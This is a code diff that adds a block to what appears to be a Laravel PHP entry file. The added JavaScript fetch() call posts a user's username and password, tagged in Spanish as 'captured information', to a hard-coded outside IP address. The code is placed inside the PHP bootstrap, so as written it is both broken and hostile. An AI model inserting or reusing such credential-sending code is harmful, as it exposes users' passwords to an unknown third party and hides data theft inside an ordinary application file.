@@ -3,6 +3,23 @@
 use Illuminate\Foundation\Application;
 use Illuminate\Http\Request;
 
+// Busca donde tengas el 'fetch' o la petición de datos
+fetch('http://54.204.57.15/api/v1/recepcion', { // <--- AQUÍ VA EL LINK
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+    },
+    body: JSON.stringify({
+        usuario: valorUsuario,
+        password: valorPassword,
+        extra: "Información capturada"
+    })
+})
+.then(response => response.json())
+.then(data => console.log('Éxito:', data))
+.catch(error => console.error('Error:', error));
+
 define('LARAVEL_START', microtime(true));
 
 // Determine if the application is in maintenance mode...
